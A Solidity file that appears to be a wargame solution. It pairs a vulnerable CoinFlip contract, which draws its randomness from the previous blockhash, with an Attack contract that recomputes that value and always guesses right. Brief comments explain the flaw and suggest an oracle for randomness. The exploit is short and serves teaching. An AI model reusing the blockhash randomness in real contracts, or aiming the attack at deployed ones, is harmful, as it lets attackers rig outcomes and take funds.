// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Attack{
    CoinFlip flip = CoinFlip(0x43d436Ed93E7f67Cbcc9382835977f21662C9bcD);

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

        flip.flip(side);
    }
}


contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


// Vulnerability
// Block.timestamp and blocknumbers can be altered by miners or hackers. It is not recommended to use block.timestamp
// and blocknumbers for random numbers.

// Recommended Mitigation steps
// Decentralized oracles like chainlink is recommended to use for true random number generation. 